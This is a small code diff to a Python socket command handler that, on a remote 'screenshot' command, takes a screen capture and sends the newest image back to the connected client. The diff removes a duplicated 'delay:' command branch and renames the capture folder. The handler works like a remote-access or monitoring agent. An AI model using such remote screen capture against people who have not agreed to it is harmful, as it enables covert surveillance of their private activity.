@@ -86,16 +86,7 @@ def handle_commands(client_socket):
 
             elif command == "screenshot":
                 subprocess.run([SCREENSHOT_EXE], check=True)
-                capture_folder = os.path.join(BASE_DIR, "captures")
-                images = [os.path.join(capture_folder, f) for f in os.listdir(capture_folder) if f.startswith("screenshot_")]
-                if images:
-                    latest = max(images, key=os.path.getctime)
-                    if wait_for_file(latest):
-                        send_file(client_socket, latest, "screenshot")
-
-            elif command.startswith("delay:"):
-                subprocess.run([SCREENSHOT_EXE], check=True)
-                capture_folder = os.path.join(BASE_DIR, "captures")
+                capture_folder = os.path.join(BASE_DIR, "screenshot")
                 images = [os.path.join(capture_folder, f) for f in os.listdir(capture_folder) if f.startswith("screenshot_")]
                 if images:
                     latest = max(images, key=os.path.getctime)
